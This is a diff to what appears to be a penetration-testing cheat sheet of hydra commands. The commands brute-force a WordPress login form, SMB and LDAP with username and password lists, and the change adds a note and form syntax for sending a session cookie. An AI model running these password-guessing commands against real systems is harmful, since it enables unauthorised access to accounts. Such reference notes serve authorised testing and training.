@@ -27,5 +27,7 @@ hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^U
 hydra -L usernames.txt -P passwords.txt $ip smb -V -f 			# SMB Brute Forcing
 hydra -L users.txt -P passwords.txt $ip ldap2 -V -f 			# LDAP Brute Forcing
 
+# Need a cookie
 
+...F=incorrect:H=Cookie:...
 ```
